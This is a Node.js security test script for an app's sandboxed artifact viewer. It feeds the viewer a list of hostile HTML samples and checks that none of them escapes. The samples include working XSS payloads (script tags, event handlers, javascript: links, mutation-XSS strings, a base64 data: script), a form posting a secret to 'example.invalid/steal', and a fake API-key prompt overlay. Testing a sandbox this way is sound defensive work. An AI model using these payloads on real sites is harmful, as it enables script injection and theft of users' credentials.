// Throws hostile HTML at the artifact viewer inside the running app and checks that nothing gets out.
//   start the app with --remote-debugging-port=9222 (or CDP_PORT=...), then:  node scripts/ui-artifact-hostile.mjs
// "Gets out" means: a script runs, the page talks to the app or the network, or a form/frame/link survives.
const port = process.env.CDP_PORT || 9222;
const targets = await (await fetch(`http://127.0.0.1:${port}/json`)).json();
const page = targets.find((t) => t.url.includes('index.html'));
const ws = new WebSocket(page.webSocketDebuggerUrl);
await new Promise((r) => (ws.onopen = r));
let id = 0;
const pending = new Map();
const frames = new Map(); // sessionId -> { url } for each artifact frame (they run in their own process)
const requests = [];
ws.onmessage = (m) => {
  const msg = JSON.parse(m.data);
  if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg.result || msg.error); pending.delete(msg.id); return; }
  if (msg.method === 'Target.attachedToTarget' && msg.params.targetInfo.type === 'iframe') {
    frames.set(msg.params.sessionId, { url: msg.params.targetInfo.url });
    send('Network.enable', {}, msg.params.sessionId);
    send('Runtime.enable', {}, msg.params.sessionId);
    send('Log.enable', {}, msg.params.sessionId);
  } else if (msg.method === 'Target.detachedFromTarget') frames.delete(msg.params.sessionId);
  else if (msg.method === 'Network.requestWillBeSent') requests.push(msg.params.request.url);
  else if (msg.method === 'Log.entryAdded' && msg.sessionId) frameLog.push(msg.params.entry.text);
};
const frameLog = [];
const send = (method, params = {}, sessionId) => new Promise((r) => { const i = ++id; pending.set(i, r); ws.send(JSON.stringify({ id: i, method, params, ...(sessionId ? { sessionId } : {}) })); });
const ev = async (expression, sessionId) => {
  const r = await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true }, sessionId);
  if (r.exceptionDetails) throw new Error(r.exceptionDetails.exception?.description || 'evaluate failed');
  return r.result?.value;
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
await send('Network.enable');
await send('Page.enable');
await send('Runtime.enable');
await send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });

let failures = 0;
const check = (ok, name, detail = '') => { if (!ok) failures += 1; console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? '  -> ' + detail : ''}`); };

const P = (n) => `parent.postMessage({pwned:${n}},'*')`;
const HOSTILE = [
  ['script tag', `<p>hi</p><script>${P(1)}</script>`],
  ['img onerror', `<img src="x" onerror="${P(2)}">`],
  ['javascript: link', `<a href="javascript:${P(3)}" data-action="x">click me</a>`],
  ['svg onload', `<svg onload="${P(4)}" width="10" height="10"></svg>`],
  ['iframe, object, embed', `<iframe src="https://example.invalid/frame"></iframe><object data="https://example.invalid/o"></object><embed src="https://example.invalid/e">`],
  ['a form that posts away', `<form action="https://example.invalid/steal" method="post"><input name="key" value="secret"><button>Send</button></form>`],
  ['CSS that loads things', `<style>@import url("https://example.invalid/x.css"); body{background:url(https://example.invalid/a.png)} p{background:url("https://example.invalid/b.png")}</style><p>styled</p>`],
  ['link, meta refresh, base', `<link rel="stylesheet" href="https://example.invalid/l.css"><meta http-equiv="refresh" content="0;url=https://example.invalid/r"><base href="https://example.invalid/"><p>x</p>`],
  ['remote image', `<img src="https://example.invalid/pixel.png"><img src="http://example.invalid/p2.png">`],
  ['fake API key prompt covering the screen', `<div style="position:fixed;inset:0;background:#c00;color:#fff;z-index:2147483647;font-size:40px">Enter your API key to continue <input></div>`],
  ['svg with script and foreignObject', `<svg><script>${P(12)}</script><foreignObject><iframe src="https://example.invalid/fo"></iframe></foreignObject></svg>`],
  ['details ontoggle', `<details open ontoggle="${P(13)}"><summary>s</summary>x</details>`],
  ['mutation XSS: noscript', `<noscript><p title="</noscript><img src=x onerror=${P(14)}>">`],
  ['mutation XSS: math/style', `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=${P(15)}&gt;">`],
  ['data: html image', `<img src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQucG9zdE1lc3NhZ2Uoe3B3bmVkOjE2fSwnKicpPC9zY3JpcHQ+">`],
  ['data attributes that could be abused', `<a class="tk-cite" data-cite="Evil|1" data-action="open-external" data-evil="x" data-url="https://example.invalid">cite</a>`],
  ['event handlers on everything', `<p onclick="${P(18)}" onmouseover="${P(19)}" onfocus="${P(20)}" style="x:expression(${P(21)})">hover</p><body onload="${P(22)}"><a href="#" onclick="${P(23)}">a</a>`],
  ['huge input', `<p>${'x'.repeat(500000)}</p><script>${P(24)}</script>`]
];

// A host area, and a recorder for everything the frames say to the page.
await ev(`(() => {
  window.__art = { messages: [], cites: [], saved: [] };
  window.addEventListener('message', (e) => { if (e.data && e.data.pwned) window.__art.messages.push(e.data); });
  let host = document.getElementById('art-test');
  if (host) host.remove();
  host = document.createElement('div');
  host.id = 'art-test';
  host.style.cssText = 'position:fixed;left:40px;top:60px;width:640px;z-index:5;background:#fff;max-height:80vh;overflow:auto';
  document.body.append(host);
})()`);

const mount = (html, sources = [], title = 'Test') => ev(`(async () => {
  const { createArtifactView } = await import('./js/artifact-view.js');
  const host = document.getElementById('art-test');
  const view = createArtifactView({ title: ${JSON.stringify(title)}, html: ${JSON.stringify(html)}, sources: ${JSON.stringify(sources)}, onCite: (c) => window.__art.cites.push(c), onSave: (f) => window.__art.saved.push(f.title) });
  view.className += ' art-under-test';
  host.append(view);
  return host.querySelectorAll('.art-under-test').length;
})()`);

// The session of the newest artifact frame (each test clears the host first, so there is only one).
async function frameContext() {
  for (const sessionId of [...frames.keys()].reverse()) {
    try {
      const href = await ev('location.href', sessionId);
      if (/^thinker-artifact:/.test(href)) return sessionId;
    } catch { /* that session is gone */ }
  }
  return undefined;
}

for (const [name, html] of HOSTILE) {
  requests.length = 0;
  await ev(`document.getElementById('art-test').textContent = ''`);
  await sleep(200);
  await mount(html);
  await sleep(1200);
  const ctx = await frameContext();
  const dom = ctx ? await ev(`({ html: document.getElementById('root').innerHTML, bad: [...document.querySelectorAll('script, iframe, object, embed, form, input, button, link, meta, base, foreignObject')].filter((e) => !(e.tagName === 'SCRIPT' && !e.closest('#root') && (e.src || '').startsWith('thinker-artifact://frame/') && ((e.src || '').endsWith('/purify.min.js') || (e.src || '').endsWith('/artifact-bridge.js'))) && !e.closest('head')).map((e) => e.tagName), handlers: [...document.querySelectorAll('#root *')].flatMap((e) => [...e.attributes].filter((a) => /^on/i.test(a.name) || (a.name === 'href' && /^javascript:/i.test(a.value))).map((a) => a.name)), links: [...document.querySelectorAll('#root a')].map((a) => a.getAttribute('href')), datas: [...document.querySelectorAll('#root *')].flatMap((e) => [...e.attributes].map((a) => a.name).filter((n) => n.startsWith('data-'))) })`, ctx) : null;
  const pwned = await ev(`window.__art.messages.length`);
  const outbound = requests.filter((u) => /^https?:/i.test(u) || /example\.invalid/.test(u));
  const frameBox = await ev(`(() => { const f = [...document.querySelectorAll('#art-test .art-iframe')].pop(); if (!f) return { w: 0, h: 0, insideHost: true, none: true }; const r = f.getBoundingClientRect(); const h = document.getElementById('art-test').getBoundingClientRect(); return { w: Math.round(r.width), h: Math.round(r.height), insideHost: r.left >= h.left - 1 && r.right <= h.right + 1 }; })()`);
  const blockedEntirely = !dom && frameBox.none && await ev(`!!document.querySelector('#art-test .art-empty')`);
  const ok = (blockedEntirely || dom) && pwned === 0 && outbound.length === 0 && (blockedEntirely || (dom.bad.length === 0 && dom.handlers.length === 0)) && frameBox.insideHost && frameBox.h <= 700;
  check(ok, `hostile: ${name}`, ok ? '' : JSON.stringify({ pwned, outbound: outbound.slice(0, 3), bad: dom?.bad, handlers: dom?.handlers, frameBox, hasDom: Boolean(dom) }));
  if (name === 'data attributes that could be abused') {
    const datas = dom.datas.filter((n) => !['data-cite', 'data-cite-unverified', 'data-action', 'data-text', 'data-page'].includes(n));
    check(datas.length === 0, 'unknown data- attributes are removed', JSON.stringify(datas));
    check(dom.html.includes('data-cite-unverified'), 'an invented citation is marked unverified');
  }
  if (name === 'javascript: link') check(!/javascript:/i.test(dom.html), 'a javascript: link is removed from the markup');
  if (name === 'huge input') check(dom.html.length <= 200000 + 2000, 'huge input is cut to a safe size', `${dom.html.length} chars`);
}

// ---- a normal artifact still works: table, details, svg, theming, and citations
await ev(`document.getElementById('art-test').textContent = ''`);
await sleep(300);
await mount(`<h2>Drill rules</h2><table class="tk-table"><tr><th>Document</th><th>Rule</th></tr><tr><td>Manual</td><td>30 days <a class="tk-cite" data-cite="Operations Manual 2023|2">p. 2</a></td></tr><tr><td>Bulletin</td><td>14 days <a class="tk-cite" data-cite="Safety Bulletin 2024|2">p. 2</a> <a class="tk-cite" data-cite="Made Up Doc|9">p. 9</a></td></tr></table><details><summary>Why?</summary>It changed in March.</details><svg width="40" height="20"><rect width="40" height="20" fill="#4f46e5"></rect></svg><div class="tk-badge tk-good">ok</div>`, [{ doc: 'Operations Manual 2023', page: 2 }, { doc: 'Safety Bulletin 2024', page: 2 }], 'Drill rules');
await sleep(1200);
const ctx = await frameContext();
const good = await ev(`({ tables: document.querySelectorAll('table').length, details: document.querySelectorAll('details').length, svg: document.querySelectorAll('svg rect').length, cites: document.querySelectorAll('[data-cite]').length, unverified: document.querySelectorAll('[data-cite-unverified]').length, bg: getComputedStyle(document.body).backgroundColor, tableBorder: getComputedStyle(document.querySelector('td')).borderTopWidth, text: document.body.innerText.slice(0, 80) })`, ctx);
check(good.tables === 1 && good.details === 1 && good.svg === 1, 'a normal artifact renders its table, details and drawing', JSON.stringify(good));
check(good.cites === 2 && good.unverified === 1, 'two real citations kept, the invented one marked', `${good.cites} kept, ${good.unverified} unverified`);
check(good.tableBorder !== '0px', 'the design kit is applied (cells have borders)', good.tableBorder);

// clicking citations: the real one opens the document, the invented one does nothing
await ev(`[...document.querySelectorAll('[data-cite]')][0].click()`, ctx);
await sleep(300);
await ev(`(() => { const e = document.querySelector('[data-cite-unverified]'); e.click(); })()`, ctx);
await sleep(300);
const cites = await ev(`window.__art.cites`);
check(cites.length === 1 && cites[0].doc === 'Operations Manual 2023' && cites[0].page === 2, 'a verified citation opens its document and page; an unverified one does nothing', JSON.stringify(cites));

// the frame cannot see the app
const escape = await ev(`(() => { try { return typeof window.parent.electronAPI + '|' + typeof window.top.document; } catch (e) { return 'blocked: ' + e.name; } })()`, ctx);
check(/^blocked/.test(escape), 'the frame cannot read the app (parent.electronAPI / top.document)', escape);
const sandbox = await ev(`document.querySelector('#art-test .art-iframe').getAttribute('sandbox')`);
check(sandbox === 'allow-scripts', 'the frame is sandboxed without same-origin, popups, forms or navigation', sandbox);

// the theme follows the app
const before = await ev(`document.documentElement.getAttribute('data-theme')`);
await ev(`document.documentElement.setAttribute('data-theme', 'light')`);
await sleep(500);
const light = await ev(`getComputedStyle(document.body).backgroundColor`, ctx);
await ev(`document.documentElement.setAttribute('data-theme', 'dark')`);
await sleep(500);
const dark = await ev(`getComputedStyle(document.body).backgroundColor`, ctx);
if (before) await ev(`document.documentElement.setAttribute('data-theme', ${JSON.stringify(before)})`);
check(light !== dark, 'artifacts follow the light and dark theme', `${light} / ${dark}`);

// save and enlarge
await ev(`document.querySelector('#art-test .art-btn[title="Export"]').click()`);
await sleep(200);
await ev(`[...document.querySelectorAll('.art-menu-item')].find((b) => b.textContent.includes('HTML page')).click()`);
await sleep(600);
check((await ev(`window.__art.saved.length`)) === 1, 'Export as an HTML page hands over the document');
await ev(`document.querySelector('#art-test .art-btn[title="Open larger"]').click()`);
await sleep(900);
check(await ev(`!!document.querySelector('.art-overlay iframe')`), 'Open larger shows it in a big overlay');
await ev(`document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
for (let i = 0; i < 15 && (await ev(`!!document.querySelector('.art-overlay')`)); i += 1) await sleep(200);
check(!(await ev(`!!document.querySelector('.art-overlay')`)), 'Escape closes the overlay');

await ev(`document.getElementById('art-test')?.remove()`);
console.log(failures === 0 ? '\nALL ARTIFACT SAFETY CHECKS PASSED' : `\n${failures} failure(s)`);
ws.close();
process.exit(failures === 0 ? 0 : 1);
